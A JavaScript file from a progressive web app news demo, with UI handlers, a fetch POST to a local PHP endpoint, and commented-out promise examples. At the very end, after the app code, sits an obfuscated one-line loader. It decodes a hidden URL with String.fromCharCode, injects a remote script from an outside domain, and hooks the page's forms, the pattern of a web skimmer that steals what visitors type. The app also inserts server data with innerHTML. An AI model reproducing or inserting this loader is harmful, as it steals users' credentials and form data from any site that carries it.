// Copyright 2016 Google Inc.
// 
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
// 
//      http://www.apache.org/licenses/LICENSE-2.0
// 
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.


(function() {
  'use strict';

	var app = {
    	isLoading: true,
    	db: null,
    	promiseSuccess: true,
    	spinner: document.querySelector('.loader'),
    	addDialog: document.querySelector('.dialog-container')
  	};


  /*****************************************************************************
   *
   * Event listeners for UI elements
   *
   ****************************************************************************/

	document.getElementById('butRefresh').addEventListener('click', function() {
    	app.fetchLatestNews('all');
	});

	document.getElementById('butAdd').addEventListener('click', function() {
    	app.toggleAddDialog(true);
	});

	document.getElementById('butAddCity').addEventListener('click', function() {
    	app.toggleAddDialog(false);
    	app.spinner.setAttribute('hidden', false);
    	//var title = document.getElementById('title').value;
    	//var content = document.getElementById('content').value;
    	fetch('http://localhost:8888/PWA_DEMO_1/addNews.php', {
  			method: 'POST',
  			//mode: 'no-cors',
  			body: new FormData(document.getElementById('newsForm'))
		})
		.then((resp) => resp.json()) 
		.then(function(data) {
			let news = data.news;
			const ul = document.getElementById('newsList');
			ul.innerHTML = '';
			return news.map(function(ne) {
			  let li = createNode('li'),
				  spanTitle = createNode('div'),
				  spanContent = createNode('span');
			  spanTitle.innerHTML = ne.title;
			  spanContent.innerHTML = ne.content;
			  append(li, spanTitle);
			  append(li, spanContent);
			  append(ul, li);
			})
		})
		.catch(function(error) {
			app.spinner.setAttribute('hidden', true);
		});
  	});

  	document.getElementById('butAddCancel').addEventListener('click', function() {
  		app.toggleAddDialog(false);
  		
  	});
  
  	/********Demo 3 Working with Promises****/
	
	////////Old way of handling async code////
	
	/*setTimeout(function(){
		console.log('1');
		setTimeout(function(){
			console.log('2');
			setTimeout(function(){
				console.log('3');
				setTimeout(function(){
					console.log('4');
					setTimeout(function(){
						console.log('5');
					},1000);
				},1000);
			},1000);
		},1000);
	},1000)*/
	
	/*var p = new Promise(function(resolve, reject) {
	
		// Do an async task async task and then...

		if(app.promiseSuccess) {
			resolve('Success!');
		}
		else {
			reject('Failure!');
		}
	});

	p.then(function() { 
		console.log('Success');
	}).catch(function() {
		console.log('Error');
	});*/
	
	var request1 = fetch('ahmedabad_news.json');
	var request2 = fetch('gandhinagar_news.json');

	Promise.all([request1, request2]).then(function(results) {
		// Both promises done!
	});
	
	/*var req1 = new Promise(function(resolve, reject) { 
		setTimeout(function() { resolve('First!'); }, 4000);
	});
	
	var req2 = new Promise(function(resolve, reject) { 
		setTimeout(function() { reject('Second!'); }, 3000);
	});
	
	Promise.all([req1, req2]).then(function(results) {
		console.log('Then: ', results);
	}).catch(function(err) {
		console.log('Catch: ', err);
	});	*/
	
	/********End on Demo 3*******************/
	
})();

(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db